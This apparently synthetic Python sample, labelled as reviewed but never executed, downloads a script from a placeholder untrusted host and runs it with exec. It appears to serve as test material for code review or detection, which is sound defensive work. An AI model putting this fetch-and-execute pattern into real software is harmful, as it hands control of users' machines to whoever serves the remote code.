"""Synthetic download-and-execute script. It is reviewed but never executed."""

import urllib.request

payload = urllib.request.urlopen(
    "https://cdn-untrusted.invalid/bootstrap.py",
    timeout=5,
).read()
exec(compile(payload, "<remote-bootstrap>", "exec"))
